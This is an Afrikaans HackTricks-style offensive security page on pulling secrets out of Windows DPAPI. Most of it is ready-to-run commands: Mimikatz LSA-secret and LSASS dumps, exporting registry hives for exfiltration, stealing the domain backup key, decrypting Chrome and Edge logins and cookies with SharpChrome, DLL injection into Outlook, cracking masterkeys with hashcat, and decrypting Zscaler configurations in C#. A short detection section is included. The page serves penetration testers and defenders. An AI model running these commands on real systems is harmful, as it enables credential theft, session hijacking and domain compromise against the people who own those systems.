# DPAPI - Onttrekking van wagwoorde

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **simmetriese enkripsie van asimmetriese private keys**, deur óf gebruikers- óf stelselgeheime as ’n belangrike bron van entropie te gebruik. Hierdie benadering vereenvoudig enkripsie vir ontwikkelaars deur hulle in staat te stel om data te enkripteer met ’n sleutel wat van die gebruiker se aanmeldgeheime afgelei is of, vir stelselenkripsie, die stelsel se domeinverifikasiegeheime te gebruik. Dit skakel dus die behoefte uit vir ontwikkelaars om self die beskerming van die enkripsiesleutel te bestuur.

Die algemeenste manier om DPAPI te gebruik, is deur die **`CryptProtectData` en `CryptUnprotectData`**-funksies, wat toepassings toelaat om data veilig te enkripteer en te dekripteer met die sessie van die proses wat tans aangemeld is. Dit beteken dat die geënkripteerde data slegs deur dieselfde gebruiker of stelsel wat dit geënkripteer het, gedekripteer kan word.

Verder aanvaar hierdie funksies ook ’n **`entropy`-parameter**, wat tydens enkripsie en dekripsie gebruik word. Om iets te dekripteer wat met hierdie parameter geënkripteer is, moet jy dus dieselfde entropy-waarde verskaf wat tydens enkripsie gebruik is.

### Generering van gebruikerssleutels

Die DPAPI genereer ’n unieke sleutel (genaamd **`pre-key`**) vir elke gebruiker gebaseer op hul geloofsbriewe. Hierdie sleutel word van die gebruiker se wagwoord en ander faktore afgelei, en die algoritme hang van die tipe gebruiker af, maar eindig as ’n SHA1. Vir domeingebruikers **hang dit byvoorbeeld van die gebruiker se NTLM-hash af**.

Dit is veral interessant omdat ’n aanvaller, indien hulle die gebruiker se wagwoord-hash kan bekom, die volgende kan doen:

- **Dekripteer enige data wat met DPAPI geënkripteer is** met daardie gebruiker se sleutel sonder om enige API te kontak
- Probeer om die **wagwoord** offline te **crack** deur die geldige DPAPI-sleutel te probeer genereer

Verder word ’n nuwe **master key** gegenereer elke keer wanneer data deur ’n gebruiker met DPAPI geënkripteer word. Hierdie master key is die een wat werklik gebruik word om data te enkripteer. Elke master key kry ’n **GUID** (Globally Unique Identifier) wat dit identifiseer.

Die master keys word in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**-gids gestoor, waar `{SID}` die Security Identifier van daardie gebruiker is. Die master key word geënkripteer deur die gebruiker se **`pre-key`** en ook deur ’n **domain backup key** vir herstel (dus word dieselfde sleutel twee keer geënkripteer deur 2 verskillende wagwoorde).

Let daarop dat die **domeinsleutel wat gebruik word om die master key te enkripteer op die domeinbeheerders is en nooit verander nie**. Indien ’n aanvaller dus toegang tot die domeinbeheerder het, kan hulle die domain backup key bekom en die master keys van alle gebruikers in die domein dekripteer.<sup>[[2]](#references)</sup>

Die geënkripteerde blobs bevat die **GUID van die master key** wat gebruik is om die data in hul headers te enkripteer.

> [!TIP]
> DPAPI encrypted blobs begin met **`01 00 00 00`**

Vind master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dit is hoe ’n klomp Master Keys van ’n gebruiker sal lyk:

![Wat is DPAPI - Users key generation: Dit is hoe ’n klomp Master Keys van ’n gebruiker sal lyk](<../../images/image (1121).png>)

### Machine/System key generation

Dit is die sleutel wat die masjien gebruik om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA secret**, wat ’n spesiale sleutel is waartoe slegs die SYSTEM-gebruiker toegang het. Hierdie sleutel word gebruik om data te enkripteer wat deur die stelsel self toeganklik moet wees, soos masjienvlak credentials of stelselwye secrets.<sup>[[2]](#references)</sup>

Let daarop dat hierdie sleutels **nie ’n domain backup het nie**, en daarom slegs plaaslik toeganklik is:

- **Mimikatz** kan toegang daartoe verkry deur LSA secrets te dump met die command: `mimikatz lsadump::secrets`
- Die secret word binne die registry gestoor, dus kan ’n administrator die **DACL-permissions wysig om toegang daartoe te verkry**. Die registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction uit registry hives is ook moontlik. Byvoorbeeld, as ’n administrator op die target, stoor die hives en eksfiltreer dit:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Doen dan op jou analysis box die DPAPI_SYSTEM LSA secret uit die hives herwin en gebruik dit om machine-scope blobs te decrypt (geskeduleerde taak-wagwoorde, dienscredentials, Wi-Fi-profiele, ens.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Data wat deur DPAPI beskerm word

Die persoonlike data wat deur DPAPI beskerm word, sluit die volgende in:

- Windows creds
- Internet Explorer en Google Chrome se passwords en outo-voltooiingsdata
- E-pos- en interne FTP-account-passwords vir toepassings soos Outlook en Windows Mail
- Passwords vir gedeelde folders, resources, wireless networks en Windows Vault, insluitend encryption keys
- Passwords vir remote desktop connections, .NET Passport en private keys vir verskeie encryption- en authentication-doeleindes
- Network passwords wat deur Credential Manager bestuur word en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger en meer
- Encrypted blobs binne die register
- ...

System-beskermde data sluit die volgende in:
- Wifi-passwords
- Scheduled task-passwords
- ...

### Opsies vir master key-ekstraksie

- As die gebruiker domain admin-voorregte het, kan hulle toegang tot die **domain backup key** verkry om alle user master keys in die domain te decrypt:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met plaaslike admin-voorregte is dit moontlik om toegang tot die **LSASS-geheue** te verkry om die DPAPI-meestersleutels van al die gekoppelde gebruikers en die SYSTEM-sleutel te onttrek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- As die gebruiker plaaslike admin-regte het, kan hulle toegang tot die **DPAPI_SYSTEM LSA secret** verkry om die masjien se master keys te dekripteer:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die gebruiker se wagwoord of NTLM-hash bekend is, kan jy die gebruiker se master keys direk **dekripteer**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy binne 'n session as die gebruiker is, is dit moontlik om die DC te vra vir die **backup key om die master keys met RPC te decrypt**. As jy local admin is en die gebruiker aangemeld is, kan jy sy **session token steel** hiervoor:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kry toegang tot DPAPI-geënkripteerde data

### Vind DPAPI-geënkripteerde data

Algemene lêers wat deur gebruikers beskerm word, is in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kontroleer ook deur `\Roaming\` na `\Local\` in die bogenoemde paaie te verander.

Voorbeelde van enumerasie:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI encrypted blobs in die lêerstelsel, registry en B64 blobs vind:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Let daarop dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (van dieselfde repo) gebruik kan word om sensitiewe data soos cookies met DPAPI te dekripteer.

#### Chromium/Edge/Electron vinnige resepte (SharpChrome)

- Huidige gebruiker, interaktiewe dekripsie van gestoorde aanmeldings/cookies (werk selfs met Chrome 127+ app-bound cookies omdat die ekstra sleutel uit die gebruiker se Credential Manager opgelos word wanneer dit in gebruikerskonteks uitgevoer word):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-analise wanneer jy slegs lêers het. Onttrek eers die AES-state-sleutel uit die profiel se "Local State" en gebruik dit dan om die cookie-DB te dekripteer:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domeinwye/afgeleë triage wanneer jy die DPAPI-domeinrugsteunsleutel (PVK) en admin op die teikengasheer het:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- As jy ’n gebruiker se DPAPI prekey/credkey (van LSASS) het, kan jy password cracking oorslaan en profieldata direk dekripteer:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Nuwer Chrome/Edge builds kan sekere cookies met "App-Bound"-enkripsie stoor. Offline-dekripsie van daardie spesifieke cookies is nie moontlik sonder die bykomende app-bound key nie; voer SharpChrome onder die teikengebruiker se konteks uit om dit outomaties te verkry. Sien die Chrome-sekuriteitsblogplasing waarna hieronder verwys word.<sup>[[5]](#references)</sup>

### Toegangsleutels en data

- **Gebruik SharpDPAPI** om credentials uit DPAPI-geënkripteerde lêers van die huidige sessie te verkry:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry credentials-inligting** soos die geïnkripteerde data en die guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Toegang tot masterkeys**:

Dekripteer ’n masterkey van ’n gebruiker wat die **domain backup key** met RPC aanvra:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI**-tool ondersteun ook hierdie argumente vir masterkey-decryption (let op hoe dit moontlik is om `/rpc` te gebruik om die domein se backup key te kry, `/password` om ’n plaintext password te gebruik, of `/pvk` om ’n DPAPI domain private key-lêer te spesifiseer...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dekripteer data met behulp van een masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI**-tool ondersteun ook hierdie argumente vir `credentials|vaults|rdg|keepass|triage|blob|ps`-ontsyfering (let op hoe dit moontlik is om `/rpc` te gebruik om die domein se backup key te verkry, `/password` om ’n plaintext password te gebruik, `/pvk` om ’n DPAPI domain private key-lêer te spesifiseer, en `/unprotect` om die huidige gebruiker se session te gebruik...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Gebruik ’n DPAPI prekey/credkey direk (geen password nodig nie)

As jy LSASS kan dump, stel Mimikatz dikwels ’n DPAPI key per logon bloot wat gebruik kan word om die gebruiker se masterkeys te decrypt sonder om die plaintext password te ken. Gee hierdie waarde direk aan die tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dekripteer sommige data met behulp van **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Vanlyn-dekripsie met Impacket dpapi.py

As jy die slagoffer se gebruiker se SID en wagwoord (of NT-hash) het, kan jy DPAPI-masterkeys en Credential Manager-blobs volledig vanlyn dekripteer met Impacket se dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifiseer artefakte op die skyf:
- Credential Manager-blobs: %APPDATA%\Microsoft\Credentials\<hex>
- Ooreenstemmende masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- As lêeroordrag-tooling onbetroubaar is, base64 die lêers op die host en kopieer die uitvoer:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Dekripteer die masterkey met die gebruiker se SID en wagwoord/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Gebruik die gedekripteerde masterkey om die credential blob te dekripteer:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Hierdie werkvloei herwin dikwels domein-credentials wat deur apps met behulp van Windows Credential Manager gestoor is, insluitend administrateurrekeninge (bv. `*_adm`).

---

### Hantering van opsionele entropy ("Third-party entropy")

Sommige toepassings stuur ’n bykomende **entropy**-waarde na `CryptProtectData`. Sonder hierdie waarde kan die blob nie gedekripteer word nie, selfs al is die korrekte masterkey bekend. Dit is dus noodsaaklik om die entropy te bekom wanneer credentials wat op hierdie manier beskerm word, geteiken word (bv. Microsoft Outlook en sommige VPN-clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is ’n user-mode DLL wat die DPAPI-funksies binne die teikenproses hook en enige opsionele entropy wat verskaf word, deursigtig aanteken. Deur EntropyCapture in **DLL-injection**-modus teen prosesse soos `outlook.exe` of `vpnclient.exe` uit te voer, word ’n lêer geskep wat elke entropy-buffer aan die calling process en blob koppel. Die vasgelegde entropy kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) verskaf word om die data te dekripteer.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline cracking van masterkeys (Hashcat & DPAPISnoop)

Microsoft het ’n **context 3** masterkey-formaat bekendgestel vanaf Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desember 2023) het hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) en **22102** (context 3) bygevoeg, wat GPU-versnelde cracking van gebruikerwagwoorde direk vanaf die masterkey-lêer moontlik maak. Aanvallers kan dus word-list- of brute-force-aanvalle uitvoer sonder om met die teikenstelsel te kommunikeer.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) outomatiseer die proses:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Die tool kan ook Credential- en Vault-blobs parse, dit met gekraakte keys decrypt en cleartext-wagwoorde export.<sup>[[8]](#references)</sup>


### Kry toegang tot data op ander masjiene

In **SharpDPAPI en SharpChrome** kan jy die **`/server:HOST`**-opsie aandui om toegang tot ’n afgeleë masjien se data te verkry. Jy moet natuurlik toegang tot daardie masjien hê, en in die volgende voorbeeld word aanvaar dat die **domain backup encryption key bekend is**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander nutsgoed

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n tool wat die extraction van alle users en computers uit die LDAP-directory en die extraction van die domeinbeheerder se backup key deur RPC outomatiseer. Die script sal dan alle computers se IP addresses resolve en 'n smbclient op alle computers uitvoer om alle DPAPI blobs van alle users te herwin en alles met die domain backup key te decrypt.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die computers list wat uit LDAP geëkstraheer is, kan jy elke subnetwerk vind, selfs as jy nie daarvan geweet het nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan secrets wat deur DPAPI beskerm word, outomaties dump. Die 2.x-release het die volgende bekendgestel:<sup>[[9]](#references)</sup>

* Parallelle collection van blobs vanaf honderde hosts
* Parsing van **context 3** masterkeys en outomatiese Hashcat cracking-integrasie
* Support vir Chrome se "App-Bound"-encrypted cookies (sien volgende section)
* 'n Nuwe **`--snapshot`**-modus om endpoints herhaaldelik te poll en nuutgeskepte blobs te diff

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is 'n C#-parser vir masterkey/credential/vault-files wat Hashcat/JtR-formate kan output en opsioneel cracking outomaties kan invoke. Dit ondersteun machine- en user-masterkey-formate volledig tot en met Windows 11 24H1.<sup>[[8]](#references)</sup>


## Algemene detections

- Access tot files in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante directories.
- Veral vanaf 'n network share soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke tooling om toegang tot LSASS-memory te verkry of masterkeys te dump.
- Event **4662**: *'n Operasie is op 'n object uitgevoer* – kan gekorreleer word met toegang tot die **`BCKUPKEY`**-object.
- Event **4673/4674** wanneer 'n process *SeTrustedCredManAccessPrivilege* versoek (Credential Manager)

---
### Kwesbaarhede en ekosisteemveranderinge van 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 'n Attacker met network access kon 'n domain member mislei om 'n malicious DPAPI backup key te retrieve, wat decryption van user masterkeys moontlik gemaak het. Gepatch in die kumulatiewe update van November 2023 – administrators moet verseker dat DCs en workstations volledig gepatch is.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound”-cookie encryption** (Julie 2024) het die legacy DPAPI-only protection vervang met 'n addisionele key wat onder die user se **Credential Manager** gestoor word. Offline decryption van cookies vereis nou beide die DPAPI masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die addisionele key recover wanneer dit met user context uitgevoer word.<sup>[[5]](#references)</sup>


### Gevallestudie: Zscaler Client Connector – Pasgemaakte entropie afgelei van SID

Zscaler Client Connector stoor verskeie configuration files onder `C:\ProgramData\Zscaler` (byvoorbeeld `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke file is ge-encrypt met **DPAPI (Machine scope)**, maar die vendor voorsien **custom entropy** wat *tydens runtime bereken* word in plaas daarvan om op disk gestoor te word.<sup>[[1]](#references)</sup>

Die entropy word uit twee elements herbou:

1. 'n Hard-coded secret wat binne `ZSACredentialProvider.dll` ingebed is.
2. Die **SID** van die Windows-account waaraan die configuration behoort.

Die algorithm wat deur die DLL geïmplementeer word, is ekwivalent aan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Omdat die geheim in ’n DLL ingebed is wat vanaf die skyf gelees kan word, kan **enige plaaslike aanvaller met SYSTEM-regte die entropy vir enige SID regenereer** en die blobs offline dekripteer:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption lewer die volledige JSON-konfigurasie, insluitend elke **device posture check** en die verwagte waarde daarvan – inligting wat baie waardevol is wanneer client-side bypasses probeer word.

> WENK: die ander encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) word met DPAPI **sonder** entropy (`16` zero bytes) beskerm. Hulle kan dus direk met `ProtectedData.Unprotect` decrypted word sodra SYSTEM privileges verkry is.

## Verwysings

- [1] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Security analysis and data recovery in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Reading DPAPI Encrypted Secrets with Mimikatz and C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Simple Extraction of DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
